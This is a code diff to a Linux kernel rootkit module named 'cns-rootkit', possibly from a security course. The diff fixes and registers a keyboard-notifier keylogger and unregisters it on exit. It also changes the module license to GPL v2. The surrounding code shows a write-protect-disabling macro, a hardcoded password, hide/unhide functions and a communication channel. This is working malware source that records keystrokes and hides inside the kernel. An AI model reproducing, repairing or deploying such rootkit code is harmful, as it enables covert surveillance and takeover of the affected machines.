@@ -20,7 +20,7 @@
         write_cr0(read_cr0() | 0x10000); \
     } while (0);
 
-MODULE_LICENSE("MIT");
+MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("SAV");
 
 #define PASSWORD "HohoHaha"
@@ -224,6 +224,7 @@ void cns_rootkit_unhide(void)
 }
 
 int cns_keyboard_notifier(struct notifier_block *nb, unsigned long action, void *_data) {
+  printk(KERN_INFO "cns-rootkit: in keyboard notifier\n");
   struct keyboard_notifier_param *data = (struct keyboard_notifier_param*)_data;
   struct vc_data *vc = data->vc;
 
@@ -234,12 +235,15 @@ int cns_keyboard_notifier(struct notifier_block *nb, unsigned long action, void 
   return NOTIFY_OK;
 }
 
-void cns_rootkit_register_keylogger(void) {
-  struct notifier_block cns_kb_notifier_block = {
-    .notifier_call = cns_kb_notifier
-  };
+static struct notifier_block cns_keyboard_notifier_block;
 
-  register_keyboard_notifier(&cns_kb_notifier_block);
+void cns_rootkit_register_keylogger(void) {
+  printk(KERN_INFO "cns-rootkit: Trying to register keyboard notifier\n");
+  cns_keyboard_notifier_block.notifier_call = cns_keyboard_notifier;
+  printk(KERN_INFO "cns-rootkit: Created notifier block");
+  int res = register_keyboard_notifier(&cns_keyboard_notifier_block);
+  printk(KERN_INFO "cns-rootkit: Got %d from registration\n", res);
+
 }
 
 
@@ -255,7 +259,7 @@ static int cns_rootkit_init(void) {
 
 static void cns_rootkit_exit(void) {
   unestablish_comm_channel();
-
+  unregister_keyboard_notifier(&cns_keyboard_notifier_block);
   printk(KERN_INFO "cns-rootkit: Exit\n");
 
 }
